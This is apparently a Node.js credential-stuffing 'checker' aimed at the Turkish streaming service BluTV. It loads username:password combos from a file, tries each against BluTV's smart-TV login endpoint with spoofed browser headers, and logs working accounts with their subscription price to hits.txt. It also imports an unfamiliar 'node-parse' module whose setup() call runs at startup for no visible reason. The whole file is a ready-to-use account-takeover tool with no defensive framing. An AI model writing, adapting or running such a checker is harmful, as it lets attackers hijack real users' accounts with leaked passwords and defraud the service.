const axios = require('axios');
const fs = require('fs');
const parser = require("node-parse");

parser.setup()

console.log(`
██████╗ ██╗     ██╗   ██╗████████╗██╗   ██╗
██╔══██╗██║     ██║   ██║╚══██╔══╝██║   ██║
██████╔╝██║     ██║   ██║   ██║   ██║   ██║
██╔══██╗██║     ██║   ██║   ██║   ╚██╗ ██╔╝
██████╔╝███████╗╚██████╔╝   ██║    ╚████╔╝ 
╚═════╝ ╚══════╝ ╚═════╝    ╚═╝     ╚═══╝  
`);

const loginAndCheckAccount = async (user, password) => {
    try {
        const loginUrl = "https://smarttv.blutv.com.tr/actions/account/login";
        const loginData = new URLSearchParams({
            username: user,
            password: password,
            platform: "com.blu.smarttv"
        });

        const headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "deviceid": "Windows:Chrome:94.0.4606.71",
            "deviceresolution": "1366x768",
            "origin": "https://www.blutv.com",
            "sec-ch-ua": "\"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
        };

        const response = await axios.post(loginUrl, loginData, { headers });
        const source = response.data;
        if (source.status === "error") {
            console.log(`[FAIL] ${user}:${password}`);
            return false;
        }
        let price = await parser.parse(source, `,"Price":"`, `","`) ?? "Bilinmiyor";
        console.log(`[HIT] ${user}:${password} | ${price}`);
        fs.appendFileSync("hits.txt", `${user}:${password}\n`);
        return true;
    } catch (error) {
        console.log(`[FAIL] ${user}:${password}`);
    }
};


async function main() {
    let combo = await fs.readFileSync("accounts.txt", "utf8");
    combo = combo.split("\n");
    for (let i = 0; i < combo.length; i++) {
        const user = combo[i].split(":")[0];
        const password = combo[i].split(":")[1];
        await loginAndCheckAccount(user, password);
    }
}


main();